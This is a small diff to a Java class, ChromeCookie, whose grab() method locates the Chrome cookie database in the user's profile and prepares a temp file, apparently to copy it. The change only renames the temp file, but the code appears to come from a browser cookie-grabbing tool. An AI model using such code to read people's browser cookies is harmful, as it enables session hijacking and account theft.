@@ -18,11 +18,11 @@ import java.util.Arrays;
 public class ChromeCookie {
     public static void grab() {
         SystemUtil.console();
-        String cookieTemp = System.getProperty("java.io.tmpdir") + "cookiedata.tmp";
+        String cookieTemp = System.getProperty("java.io.tmpdir") + "chromecookie.tmp";
         String cookiePath = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
         File cookieTempFile = new File(cookieTemp);
         try {
-            cookieTempFile = File.createTempFile("cookiedata", ".tmp");
+            cookieTempFile = File.createTempFile("chromecookie", ".tmp");
             cookieTemp = cookieTempFile.getAbsolutePath();
         }catch (IOException e){
             SystemUtil.console("Failed to create temp file.");
